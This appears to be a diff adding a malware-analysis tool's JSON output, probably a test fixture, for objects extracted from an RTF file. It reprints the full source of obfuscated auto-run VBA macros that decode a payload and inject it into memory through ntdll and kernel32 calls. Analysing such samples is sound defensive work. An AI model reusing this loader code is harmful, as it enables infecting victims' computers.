+    "file:8eb06ca9dde6308080d57854be829c841302f41bb3f4e6f997f6273c771932de": {
+      "detections": {},
+      "directives": {},
+      "excluded_analysis": {},
+      "paths": {
+        "objects.rtf.rtfobj/objects.rtf_object_000004CE.noname": {
+          "type=document.rtf.object": true
+        }
+      },
+      "redirection": "file:0d652dc8b0cc3ecb9d3111ea218e2f1f78fbe553fac50594a1aafc80e81a000b",
+      "relationships": {
+        "extracted_from file:0d652dc8b0cc3ecb9d3111ea218e2f1f78fbe553fac50594a1aafc80e81a000b": true
+      },
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "text/plain",
+            "type": "ASCII text"
+          },
+          "summary": "File Type Analysis: ASCII text (text/plain)",
+          "tags": {}
+        }
+      },
+      "tags": {
+        "extracted_rtf": true
+      }
+    },
+    "file:a09c94265b014d4997d783a5dc0e73c2d94c4d800093eabae35c8accae9e60ac": {
+      "detections": {},
+      "directives": {},
+      "excluded_analysis": {},
+      "paths": {
+        "objects.rtf.rtfobj/objects.rtf_object_0006C3AE.package": {
+          "type=document.rtf.object": true
+        }
+      },
+      "redirection": "file:0d652dc8b0cc3ecb9d3111ea218e2f1f78fbe553fac50594a1aafc80e81a000b",
+      "relationships": {
+        "extracted_from file:0d652dc8b0cc3ecb9d3111ea218e2f1f78fbe553fac50594a1aafc80e81a000b": true
+      },
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "application/octet-stream",
+            "type": "data"
+          },
+          "summary": "File Type Analysis: data (application/octet-stream)",
+          "tags": {}
+        }
+      },
+      "tags": {
+        "extracted_rtf": true
+      }
+    },
+    "file:a29e05514715819ebc779c3ce23269e09434f1a8acbf989fd67abbcba357e34e": {
+      "detections": {},
+      "directives": {},
+      "excluded_analysis": {},
+      "paths": {
+        "objects.rtf.rtfobj/objects.rtf_object_0006C280.bin": {
+          "type=document.rtf.object": true
+        }
+      },
+      "redirection": "file:0d652dc8b0cc3ecb9d3111ea218e2f1f78fbe553fac50594a1aafc80e81a000b",
+      "relationships": {
+        "extracted_from file:0d652dc8b0cc3ecb9d3111ea218e2f1f78fbe553fac50594a1aafc80e81a000b": true
+      },
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "text/plain",
+            "type": "ASCII text"
+          },
+          "summary": "File Type Analysis: ASCII text (text/plain)",
+          "tags": {}
+        }
+      },
+      "tags": {
+        "extracted_rtf": true
+      }
+    },
+    "file:a363fb24edce3162326238d0152b99845d0dd0be53191183aad2ceba2d168a2a": {
+      "detections": {},
+      "directives": {
+        "sandbox": true
+      },
+      "excluded_analysis": {},
+      "paths": {
+        "objects.rtf.rtfobj/objects.rtf_object_00000C9B.doc": {
+          "type=document.rtf.object": true
+        }
+      },
+      "redirection": "file:0d652dc8b0cc3ecb9d3111ea218e2f1f78fbe553fac50594a1aafc80e81a000b",
+      "relationships": {
+        "extracted_from file:0d652dc8b0cc3ecb9d3111ea218e2f1f78fbe553fac50594a1aafc80e81a000b": true
+      },
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": true,
+            "is_office_ext": true,
+            "is_ole_file": true,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "application/msword",
+            "type": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 6.1, Code page: 1252, Author: nigan, Template: Normal, Last Saved By: nigan, Revision Number: 3, Name of Creating Application: Microsoft Office Word, Total Editing Time: 03:00, Create Time/Date: Sun Dec 31 15:32:00 2017, Last Saved Time/Date: Sun Dec 31 15:42:00 2017, Number of Pages: 24, Number of Words: 3187, Number of Characters: 18168, Security: 8"
+          },
+          "summary": "File Type Analysis: Composite Document File V2 Document, Little Endian, Os: Windows, Version 6.1, Code page: 1252, Author: nigan, Template: Normal, Last Saved By: nigan, Revision Number: 3, Name of Creating Application: Microsoft Office Word, Total Editing Time: 03:00, Create Time/Date: Sun Dec 31 15:32:00 2017, Last Saved Time/Date: Sun Dec 31 15:42:00 2017, Number of Pages: 24, Number of Words: 3187, Number of Characters: 18168, Security: 8 (application/msword) (ms office document) (ole compound file)",
+          "tags": {}
+        },
+        "olevba_v1_2": {
+          "details": {
+            "keyword_summary": {
+              "autoexec": 1,
+              "base64 string": 1,
+              "hex string": 1,
+              "suspicious": 1
+            },
+            "macros": [
+              {
+                "file_name": "<root>/files/objects.rtf.rtfobj/objects.rtf_object_00000C9B.doc",
+                "local_path": "b1b0ee7865090da37e0302cf26c9bded785ffb3ab7e2fe0d781f0ce9ea6397fa",
+                "stream_path": "Macros/VBA/ThisDocument",
+                "vba_code": "\n\nPrivate Sub Document_Open()\nchopper = \"hercules\"\nbedding\nreclusion = 28 + 10\n Pmt 0, reclusion, 20522, 59196, 2\nEnd Sub\n\n",
+                "vba_filename": "ThisDocument.cls"
+              },
+              {
+                "file_name": "<root>/files/objects.rtf.rtfobj/objects.rtf_object_00000C9B.doc",
+                "local_path": "c4382d49b92b42f3e4326108e8861ccc70e14a5e68937f07243526cb71eecff4",
+                "stream_path": "Macros/VBA/confining",
+                "vba_code": "#If (62 - 27 + 365 + 83 - 56 + 273) > ((87 - 34 + 267) - (11 - 42 + 571) * 1) And ((21 - 24 + 31) - (73 - 111 + 66)) * 2 < (Win64) Then\nPublic Declare PtrSafe Function prelacy _\nLib \"ntdll   \" Alias _\n\"NtAllocateVirtualMemory\" (copper As LongPtr, aether As LongPtr, ByVal chamaeleontidae As LongPtr, catByVal As LongPtr, ruptiliocarpon As LongPtr, ByVal argali As LongPtr) As LongPtr\n#End If\nFunction manta(almost) As String\nDim ifla(63) As Long\nDim fossils As Long\nDim absolver As Long\nDim bromelia() As Byte\nDim exhibitionism As Long\nDim beaugregory As Long\nDim antihypertensive(63) As Long\nDim supplant As String\nDim approximative(63) As Long\nDim ungoverned(6962) As Byte\ngradient = 30 - 10 + 4012\nDim annals As Long\n\nscion = 78 - 93 + 65295\ngangster = 27 - 24 + 253\nintroject = 71 - 76 + 69\nDim panini As Variant\n\nbedside = 31 - 74 + 16711723\noberon = 123 - 107 + 16515056\nautobiography = 101 - 36 + 257983\nDim barbiturate As Integer\n\nhamiform = 13 - 41 + 4124\ndrippy = 44 - 51 + 262151\noutlier = 49 - 111 + 317\nflinch = 14 - 70 + 65592\ncagily = 113 - 22 - 28\nDim copartner As Integer\nfuton = 8 - 49 + 7884\nDim mf() As Byte\nmf = VBA.StrConv(almost, 120 + 8)\nimporter = 45 + 7\nPmt 0, importer, 25416, 25449, 7\naffect = 7840 + 3\nmoneymaking = vbKeyShift - 12\nFor chordal = 0 To affect\nIf chordal Mod 2 = 0 Then\nmf(chordal) = mf(chordal) - moneymaking\nElse\nmf(chordal) = mf(chordal) - (moneymaking - 1)\nEnd If\nNext chordal\nboswellia = 58 + 16\nPmt 0, boswellia, 33800, 37708, 7\nindulgency = unrestraint\nFor fossils = (16 - 8 * 2) * 1 To (80 / 2 + 23) * (7 - 6)\napproximative(fossils) = admired(fossils, introject, 61)\nantihypertensive(fossils) = admired(fossils, hamiform, 61)\nifla(fossils) = admired(fossils, drippy, 61)\nNext fossils\nsalleamanger = 28 + 4\nPmt 0, salleamanger, 37442, 33315, 3\nbromelia = mf\nappeasable = 74 - 4 - 66\nceliocentesis = 35 + 6\nPmt 0, celiocentesis, 32953, 31463, 7\nexpectable = 61 - 55 - 3\nattendance = expectable + 1\nbentley = 74 - 47 - 25\nFor absolver = 0 To affect\nurnam = bromelia(absolver)\ntorah = bromelia(absolver + 2)\nhold = antihypertensive(indulgency(bromelia(absolver + 1)))\nnamibian = approximative(indulgency(torah)) + indulgency(bromelia(absolver + expectable))\nexhibitionism = ifla(indulgency(urnam)) + hold + namibian\nfossils = admired(exhibitionism, bedside, 53)\nungoverned(beaugregory) = admired(fossils, flinch, 43)\nfossils = admired(exhibitionism, scion, 53)\nungoverned(beaugregory + 1) = admired(fossils, gangster, 43)\nungoverned(beaugregory + bentley) = admired(exhibitionism, outlier, 53)\nbeaugregory = beaugregory + bentley + 1\nabsolver = absolver + 3\nNext\nmanta = ungoverned\nEnd Function\n\n\n",
+                "vba_filename": "confining.bas"
+              },
+              {
+                "file_name": "<root>/files/objects.rtf.rtfobj/objects.rtf_object_00000C9B.doc",
+                "local_path": "a643d4a7507eb88cc6573e362efe12d844d0973e6a73de647ad456453daf70d9",
+                "stream_path": "Macros/VBA/dominis",
+                "vba_code": "#If (2 - 59 + 457 + 82 - 79 + 297) > ((59 - 32 + 293) - (79 - 22 + 483) * 1) And Not ((47 - 59 + 40) - (75 - 44 - 3)) * 2 < (Win64) Then\nPublic Declare Function gaucherie _\nLib \"Kernel32\" Alias _\n\"CreateTimerQueueTimer\" (soil As Any, ByVal calomel As Any, ByVal botany As Any, ByVal groundfish As Any, ByVal conserve As Any, ByVal euphoric As Any, ByVal catamaran As Any) As Long\n#End If\n#If (62 - 27 + 365 + 83 - 56 + 273) > ((87 - 34 + 267) - (11 - 42 + 571) * 1) And ((21 - 24 + 31) - (73 - 111 + 66)) * 2 < (Win64) Then\nPublic Declare PtrSafe Function gaucherie _\nLib \"Kernel32\" Alias _\n\"CreateTimerQueueTimer\" (odd As Any, ByVal rhoeadales As Any, ByVal gradeconstructed As Any, ByVal consumere As Any, ByVal naprapath As Any, ByVal aust As Any, ByVal acarina As Any) As Long\n#End If\nFunction reposit(tempera, bearings, agriculturist)\nDim accidents As Long\nDim electronically As Integer\nDim desolately As Long\nDim separately As Integer\nDim coyly As Long\nDim unapparent As String\nDim ever As Long\nDim despitefully As Variant\nDim crenate As Long\nDim inaffable As String\nDim gharrywallah As Variant\ndogtooth = dogtooth\ndogtooth = costa\naccidents = tempera\ncrenate = agriculturist\ndogtooth = dogtooth\ncoyly = bearings\nfeast = 55 + 55\n Pmt 0, feast, 26368, 10482, 5\n\nfoyer = Rnd(174)\ndesolately = 9 - 118 + 108\nmercies ByVal desolately, _\naccidents, coyly, _\ncrenate, ever\nconvertible = bracing + 121\nEnd Function\n",
+                "vba_filename": "dominis.bas"
+              },
+              {
+                "file_name": "<root>/files/objects.rtf.rtfobj/objects.rtf_object_00000C9B.doc",
+                "local_path": "b2e5dd4cd0a986d6f8a4aee8b2e86b0a967133be83547155d0f91d0542b52cc6",
+                "stream_path": "Macros/VBA/fixut",
+                "vba_code": "#If (62 - 27 + 365 + 83 - 56 + 273) > ((87 - 34 + 267) - (11 - 42 + 571) * 1) And ((21 - 24 + 31) - (73 - 111 + 66)) * 2 < (Win64) Then\nPublic Declare PtrSafe Function mercies _\nLib \"ntdll  \" Alias _\n\"NtWriteVirtualMemory\" (ByVal alephnull As Any, ByVal alloyed As Any, ByVal bloom As Any, ByVal marker As Any, ByVal attenuated As Any) As LongPtr\n#End If\nFunction admired(whimsicality, antigua, nulli)\nIf nulli = 43 + (10 / 2 - 5) Then\nadmired = whimsicality \\ antigua\nEnd If\nIf nulli = 53 + (5 - 3) / 2 - 1 Then\nadmired = whimsicality And antigua\nEnd If\nIf nulli = 61 + (56 / 7 - 4 * 2) Then\nadmired = whimsicality * antigua\nEnd If\nEnd Function\nFunction nonsense(sequent, impact, dismantle)\nDim cofactor As Long\nDim kenyapithecus As Long\nDim maggior As LongPtr\nDim antacid As LongPtr\nDim odoriferous As LongPtr\nDim grid As Long\nDim magnetism As LongPtr\nDim monrovia As LongPtr\nbracing = foyer And 408\ndogtooth = dogtooth\nantacid = sequent\nmonrovia = dismantle\nconvertible = convertible + 275\nmagnetism = impact\nbootless = 3 + 60\n Pmt 0, bootless, 19241, 16857, 4\n\ndogtooth = dogtooth\nmaggior = 119 - 65 - 55\nmercies ByVal maggior, _\nantacid, magnetism, _\nmonrovia, odoriferous\ncosta = \"appropinquation\"\nEnd Function\n\nFunction monism(ache)\nDim grnoematagr As Long\nDim amphibolite As Byte\nDim alteration As String\nDim cloudburst As Long\n#If (119 - 44 + 325 + 42 - 114 + 372) > ((111 - 124 + 333) - (71 - 39 + 508) * 1) And ((41 - 34 + 21) - (72 - 33 - 11)) * 2 < (Win64) Then\nDim argument As Variant\nDim mindfulness As LongPtr\nmasaniello = 80 - 101 + 29\nDim anguilliformes As LongPtr\nDim wirehair As String\nDim caliver As Long\nDim uncomely As LongPtr\nDim belleslettres As Variant\nemanate = VarPtr(mindfulness)\nplacoderm = nonsense(emanate, VarPtr(ache) + (62 - 20 - 34), masaniello)\n#End If\n#If (45 - 12 + 367 + 115 - 46 + 231) > ((44 - 56 + 332) - (126 - 53 + 467) * 1) And Not ((79 - 122 + 71) - (46 - 63 + 45)) * 2 < (Win64) Then\nDim mindfulness As Long\nmasaniello = 125 - 12 - 109\nDim anguilliformes As Long\nDim uncomely As Long\nemanate = VarPtr(mindfulness)\nplacoderm = reposit(emanate, VarPtr(ache) + (91 - 2 - 81), masaniello)\n#End If\ngroomed = 70 - 18 - 53\nanguilliformes = 120 - 101 - 19\ncomplaint = 22 - 108 + 86\nuncomely = 61 - 91 + 10015\nconditionally = 23 - 103 + 4176\nfanon = 43 - 29 + 50\nanthropology = prelacy(ByVal groomed, _\nanguilliformes, ByVal complaint, uncomely, _\nByVal conditionally, ByVal fanon)\ncosta = dogtooth\ndogtooth = \"pilgarlic\"\nreposit anguilliformes, mindfulness, 67 - 89 + 5905\nalarmism = 46 + 59\nPmt 0, alarmism, 3506, 33846, 5\nmonism = anguilliformes\nEnd Function\n\nFunction bedding()\nDim gueridon As Variant\nDim nor As Variant\ndimocarpus.cynocephalidae.Value = Day(#12/5/2013#)\nvarday = barrels = \"jail\"\naerobacter = allomorph\nclassicistic = \"catchweed\"\ngodship = heifer\ndumfoundered = \"omsk\"\n\ndoubts = \"prenticeship\"\ndastardly = involucre\nSet metalepsis = dimocarpus.cynocephalidae.SelectedItem\nadverb = 6 + 15\n Pmt 0, adverb, 36937, 59909, 5\n\nbrowbeaten = metalepsis.Name\nnonpsychoactive = 23 - 121 + 7942\nconciliation = Right(browbeaten, nonpsychoactive)\nfogged = confining.manta(conciliation)\natkins = 31 + 54\n Pmt 0, atkins, 30827, 16166, 5\n\nleontocebus = \"protrusive\"\n#If (76 - 18 + 342 + 45 - 33 + 288) > ((65 - 81 + 336) - (31 - 11 + 520) * 1) And ((32 - 72 + 68) - (36 - 60 + 52)) * 2 < (Win64) Then\nDim ladyinwaiting As String\nDim blastocyte As LongPtr\nDim hoax As LongPtr\nDim obediant As String\nDim stonechat As String\nDim fallaciousness As LongPtr\nDim demythologization As LongPtr\nDim render As LongPtr\nabdominoscope = 8 - 42 + 2098\n#ElseIf (106 - 90 + 384 + 3 - 46 + 343) > ((67 - 35 + 288) - (72 - 57 + 525) * 1) And Not ((95 - 75 + 8) - (114 - 21 - 65)) * 2 < (Win64) Then\nDim eileton As Variant\nDim hoax As Long\nDim signified As Long\nDim blastocyte As Long\nDim fallaciousness As Long\nautoptical = 31 - 71 + 821\nDim demythologization As Long\nDim render As Long\nabdominoscope = autoptical + 3459\n#End If\ndiamondback = 94 - 116 + 22\nthallophyte = \"isotonic\"\ncostal = 39 + 45\n Pmt 0, costal, 11568, 42979, 3\n\nvenogram = \"assistive\"\nseafood = \"mpriser\"\nanothers = \"marduk\"\nstyrene = 36 + 39\n Pmt 0, styrene, 33132, 35943, 4\n\netropus = fogged\nchromatism = \"broad\"\nblastocyte = monism(etropus)\nabrasion = melancholic\nefface = \"macrobiotic\"\nDim isospondyli As String\nDim postmeridian As Long\nfallaciousness = 46 - 120 + 74\nhoax = blastocyte + abdominoscope\ndemythologization = 30 - 82 + 201579\nrender = 37 - 106 + 3569\nformonly = gaucherie(demythologization, _\nfallaciousness, _\nhoax, fallaciousness, _\nfallaciousness, fallaciousness, _\nfallaciousness)\ndreary = 50 + 6\n Pmt 0, dreary, 38704, 58330, 6\n\nEnd Function\n\n\n\n",
+                "vba_filename": "fixut.bas"
+              },
+              {
+                "file_name": "<root>/files/objects.rtf.rtfobj/objects.rtf_object_00000C9B.doc",
+                "local_path": "8d26a25ee377b3a0e3ac80c2b94428810d1a0cf964556e9627f572c1d7926427",
+                "stream_path": "Macros/VBA/mirtans",
+                "vba_code": "#If (2 - 59 + 457 + 82 - 79 + 297) > ((59 - 32 + 293) - (79 - 22 + 483) * 1) And Not ((47 - 59 + 40) - (75 - 44 - 3)) * 2 < (Win64) Then\nPublic Declare Function prelacy _\nLib \"ntdll   \" Alias _\n\"NtAllocateVirtualMemory\" (pretrial As Long, canonist As Long, ByVal segnity As Long, narrowedByVal As Long, crowned As Long, ByVal absinthe As Long) As Long\nPublic Declare Function mercies _\nLib \"ntdll   \" Alias _\n\"NtWriteVirtualMemory\" (ByVal plonk As Any, ByVal adamant As Any, ByVal sanctorum As Any, ByVal developer As Any, ByVal dead As Any) As Long\n#End If\n\nFunction unrestraint()\nDim subjecta(255) As Byte\nfrostbound = 31 - 37 + 71\nFor i = frostbound To (57 - 78 + 112)\nsubjecta(frostbound) = frostbound - (127 - 53 - 9)\nfrostbound = frostbound + 1\nIf athanor > (48 - 5 + 48) Then Exit For\nNext\n\nfrostbound = (86 - 20 - 18)\nFor i = frostbound To (65 - 82 + 75)\nsubjecta(frostbound) = frostbound + (78 - 125 + 51)\nfrostbound = frostbound + 1\nIf athanor > (55 - 120 + 123) Then Exit For\nNext\nfrostbound = (68 - 47 + 76)\nFor i = frostbound To (13 - 99 + 209)\nsubjecta(frostbound) = frostbound - (77 - 115 + 109)\nfrostbound = frostbound + 1\nIf athanor > (53 - 117 + 187) Then Exit For\nNext\nsubjecta(87 - 123 + 83) = (48 - 9 + 24)\nfrostbound = (68 - 31 + 6)\nsubjecta(frostbound) = (109 - 94 + 47)\nunrestraint = subjecta\nEnd Function\n",
+                "vba_filename": "mirtans.bas"
+              }
+            ],
+            "type": "OLE"
+          },
+          "summary": "OLEVBA Analysis: (5 macro files) (OLE) | autoexec=1, suspicious=1, hex string=1, base64 string=1",
+          "tags": {}
+        }
+      },
+      "tags": {
+        "extracted_rtf": true,
+        "microsoft_office": true,
+        "ole": true,
+        "olevba": true
+      }
+    },
+    "file:a643d4a7507eb88cc6573e362efe12d844d0973e6a73de647ad456453daf70d9": {
+      "detections": {},
+      "directives": {
+        "sandbox": true
+      },
+      "excluded_analysis": {
+        "olevba_v1_2": true
+      },
+      "paths": {
+        "objects.rtf.rtfobj/objects.rtf_object_00000C9B.doc.olevba/macro_2.bas": {
+          "type=script.macro.vba": true
+        }
+      },
+      "redirection": "file:a363fb24edce3162326238d0152b99845d0dd0be53191183aad2ceba2d168a2a",
+      "relationships": {},
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "text/plain",
+            "type": "ASCII text"
+          },
+          "summary": "File Type Analysis: ASCII text (text/plain)",
+          "tags": {}
+        }
+      },
+      "tags": {
+        "macro": true
+      }
+    },
+    "file:b1b0ee7865090da37e0302cf26c9bded785ffb3ab7e2fe0d781f0ce9ea6397fa": {
+      "detections": {},
+      "directives": {
+        "sandbox": true
+      },
+      "excluded_analysis": {
+        "olevba_v1_2": true
+      },
+      "paths": {
+        "objects.rtf.rtfobj/objects.rtf_object_00000C9B.doc.olevba/macro_0.bas": {
+          "type=script.macro.vba": true
+        }
+      },
+      "redirection": "file:a363fb24edce3162326238d0152b99845d0dd0be53191183aad2ceba2d168a2a",
+      "relationships": {},
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "text/plain",
+            "type": "ASCII text"
+          },
+          "summary": "File Type Analysis: ASCII text (text/plain)",
+          "tags": {}
+        }
+      },
+      "tags": {
+        "macro": true
+      }
+    },
+    "file:b2e5dd4cd0a986d6f8a4aee8b2e86b0a967133be83547155d0f91d0542b52cc6": {
+      "detections": {},
+      "directives": {
+        "sandbox": true
+      },
+      "excluded_analysis": {
+        "olevba_v1_2": true
+      },
+      "paths": {
+        "objects.rtf.rtfobj/objects.rtf_object_00000C9B.doc.olevba/macro_3.bas": {
+          "type=script.macro.vba": true
+        }
+      },
+      "redirection": "file:a363fb24edce3162326238d0152b99845d0dd0be53191183aad2ceba2d168a2a",
+      "relationships": {},
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "text/plain",
+            "type": "ASCII text"
+          },
+          "summary": "File Type Analysis: ASCII text (text/plain)",
+          "tags": {}
+        }
+      },
+      "tags": {
+        "macro": true
+      }
+    },
+    "file:b5d4045c3f466fa91fe2cc6abe79232a1a57cdf104f7a26e716e0a1e2789df78": {
+      "detections": {},
+      "directives": {},
+      "excluded_analysis": {},
+      "paths": {
+        "objects.rtf.rtfobj/objects.rtf_object_0006C482.raw": {
+          "type=document.rtf.object": true
+        }
+      },
+      "redirection": "file:0d652dc8b0cc3ecb9d3111ea218e2f1f78fbe553fac50594a1aafc80e81a000b",
+      "relationships": {
+        "extracted_from file:0d652dc8b0cc3ecb9d3111ea218e2f1f78fbe553fac50594a1aafc80e81a000b": true
+      },
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "text/plain",
+            "type": "ASCII text, with no line terminators"
+          },
+          "summary": "File Type Analysis: ASCII text, with no line terminators (text/plain)",
+          "tags": {}
+        }
+      },
+      "tags": {
+        "extracted_rtf": true
+      }
+    },
+    "file:c30186bcfe6ce894da77cea466ebabc941b25ff9a2330120d9fb39ccb2863b5c": {
+      "detections": {},
+      "directives": {},
+      "excluded_analysis": {},
+      "paths": {
+        "objects.rtf.rtfobj/objects.rtf_._._evil.exe": {
+          "type=document.rtf.object": true
+        }
+      },
+      "redirection": "file:0d652dc8b0cc3ecb9d3111ea218e2f1f78fbe553fac50594a1aafc80e81a000b",
+      "relationships": {
+        "extracted_from file:0d652dc8b0cc3ecb9d3111ea218e2f1f78fbe553fac50594a1aafc80e81a000b": true
+      },
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "text/plain",
+            "type": "ASCII text"
+          },
+          "summary": "File Type Analysis: ASCII text (text/plain)",
+          "tags": {}
+        }
+      },
+      "tags": {
+        "extracted_rtf": true
+      }
+    },
+    "file:c4382d49b92b42f3e4326108e8861ccc70e14a5e68937f07243526cb71eecff4": {
+      "detections": {},
+      "directives": {
+        "sandbox": true
+      },
+      "excluded_analysis": {
+        "olevba_v1_2": true
+      },
+      "paths": {
+        "objects.rtf.rtfobj/objects.rtf_object_00000C9B.doc.olevba/macro_1.bas": {
+          "type=script.macro.vba": true
+        }
+      },
+      "redirection": "file:a363fb24edce3162326238d0152b99845d0dd0be53191183aad2ceba2d168a2a",
+      "relationships": {},
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "text/plain",
+            "type": "ASCII text"
+          },
+          "summary": "File Type Analysis: ASCII text (text/plain)",
+          "tags": {}
+        }
+      },
+      "tags": {
+        "macro": true
+      }
+    },
+    "file:c50e6b4b99943988bb73d4274691122c95a05a4fc4018c87d9b32e3c32f4ab67": {
+      "detections": {},
+      "directives": {},
+      "excluded_analysis": {},
+      "paths": {
+        "objects.rtf.rtfobj/objects.rtf_notes.txt": {
+          "type=document.rtf.object": true
+        }
+      },
+      "redirection": "file:0d652dc8b0cc3ecb9d3111ea218e2f1f78fbe553fac50594a1aafc80e81a000b",
+      "relationships": {
+        "extracted_from file:0d652dc8b0cc3ecb9d3111ea218e2f1f78fbe553fac50594a1aafc80e81a000b": true
+      },
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "text/plain",
+            "type": "ASCII text"
+          },
+          "summary": "File Type Analysis: ASCII text (text/plain)",
+          "tags": {}
+        }
+      },
+      "tags": {
+        "extracted_rtf": true
+      }
+    },
+    "file:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855": {
+      "detections": {},
+      "directives": {},
+      "excluded_analysis": {},
+      "paths": {
+        "objects.rtf.rtfobj/objects.rtf_object_0006C46A.raw": {
+          "type=document.rtf.object": true
+        }
+      },
+      "redirection": "file:0d652dc8b0cc3ecb9d3111ea218e2f1f78fbe553fac50594a1aafc80e81a000b",
+      "relationships": {
+        "extracted_from file:0d652dc8b0cc3ecb9d3111ea218e2f1f78fbe553fac50594a1aafc80e81a000b": true
+      },
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "inode/x-empty",
+            "type": "empty"
+          },
+          "summary": "File Type Analysis: empty (inode/x-empty)",
+          "tags": {}
+        }
+      },
+      "tags": {
+        "extracted_rtf": true
+      }
+    },
+    "file:ef80ffadcd476119eb353b5f7a05b62a666a4f10f2c83a58b114592733be693e": {
+      "detections": {},
+      "directives": {
+        "sandbox": true
+      },
+      "excluded_analysis": {},
+      "paths": {
+        "objects.rtf.rtfobj/objects.rtf_inner.zip.extracted/inner.txt": {}
+      },
+      "relationships": {
+        "extracted_from file:44e9d0d4930ff40a7d26c157901787e27b29699eaa20c610006486c66e91c414": true
+      },
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "text/plain",
+            "type": "ASCII text"
+          },
+          "summary": "File Type Analysis: ASCII text (text/plain)",
+          "tags": {}
+        }
+      },
+      "tags": {}
+    },
+    "file:f0393febe8baaa55e32f7be2a7cc180bf34e52137d99e056c817a9c07b8f239a": {
+      "detections": {},
+      "directives": {},
+      "excluded_analysis": {},
+      "paths": {
+        "objects.rtf.rtfobj/objects.rtf_object_0006C4A6.raw": {
+          "type=document.rtf.object": true
+        }
+      },
+      "redirection": "file:0d652dc8b0cc3ecb9d3111ea218e2f1f78fbe553fac50594a1aafc80e81a000b",
+      "relationships": {
+        "extracted_from file:0d652dc8b0cc3ecb9d3111ea218e2f1f78fbe553fac50594a1aafc80e81a000b": true
+      },
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "text/plain",
+            "type": "ASCII text, with no line terminators"
+          },
+          "summary": "File Type Analysis: ASCII text, with no line terminators (text/plain)",
+          "tags": {}
+        }
+      },
+      "tags": {
+        "extracted_rtf": true
+      }
+    }
+  }
+}
